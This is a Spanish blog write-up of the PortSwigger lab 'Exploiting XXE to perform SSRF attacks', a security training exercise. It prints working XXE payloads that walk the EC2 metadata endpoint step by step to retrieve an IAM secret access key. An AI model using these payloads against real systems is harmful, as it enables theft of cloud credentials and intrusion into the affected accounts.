---
layout: single
title: Exploiting XXE to perform SSRF attacks – PortSwigger Write Up
excerpt: "En este post vamos a estar resolviendo el laboratorio de PortSwigger: “Exploiting XXE to perform SSRF attacks."
date: 2022-10-15
classes: wide
#header:
#  teaser: /assets/images/portswigger/stored_xss_into_html_context_with_nothing_encoded/portada.png
#  teaser_home_page: true
categories:
  - Portswigger
tags:
  - XML injection
  - Apprentice
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: "Exploiting XXE to perform SSRF attacks."

## Pasos

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/1.png" width="1000">
</p><br>

Vemos que en esta situación es una tienda donde podemos ver los detalles de los productos y si nos fijamos podemos ver el stock de cada uno de los productos.
Este laboratorio tiene una función "Check stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

El servidor de laboratorio está ejecutando un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. 
Este punto final se puede utilizar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales.
Para resolver el laboratorio, aproveche la vulnerabilidad XXE para realizar un `ataque SSRF` que obtenga el secret access key de IAM del servidor desde el punto final de metadatos EC2.

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/2.png" width="1000">
</p><br>


Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y 
hacemos clic en Check stock y buscamos el paquete en el Http history y lo enviamos al `Repeater`.

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/3.png" width="1000">
</p><br>


Entonces ahora debemos generar un payload para el ataque, el cual será el siguiente basandonos en la estructura del XML del paquete:


```plaintext
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```
Y enviamos el paquete, observamos lo siguiente:

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/4.png" width="1000">
</p><br>

Recibimos como respuesta el string latest, lo agregamos a la url de la ip a la que queremos acceder y obtenemos la siguiente respuesta:
```plaintext
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
<stockCheck>
        <productId>  
                &xxe;
        </productId> 
        <storeId>
                1 
        </storeId>
</stockCheck>
```
<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/5.png" width="1000">
</p><br>

Y volvemos a agregar la respuesta en la url del payload y obtenemos la siguiente respuesta:
```plaintext
"Invalid product ID: iam"
```

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/6.png" width="1000">
</p><br>

Y seguimos agregando todos los que nos sugiere hasta tener el siguiente payload.
```plaintext
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
        <productId>  
                &xxe;
        </productId> 
        <storeId>
                1 
        </storeId>
</stockCheck>
```



<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/7.png" width="1000">
</p><br>


<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/8.png" width="1000">
</p><br>

El cual nos devuelve la siguiente respuesta:

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/9.png" width="1000">
</p><br>

Y los que nos piden es el `secret access key`. Entramos al home del laboratorio desde el navegador para verificar que completamos el laboratorio.

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/10.png" width="1000">
</p><br>

Finalmente completamos el laboratorio.

<p align="center">
     <img src="/assets/images/portswigger/exploiting_xxe_to_perform_ssrf_attacks/11.png" width="1000">
</p><br>


¡Un saludo y espero que os sirva de apoyo!
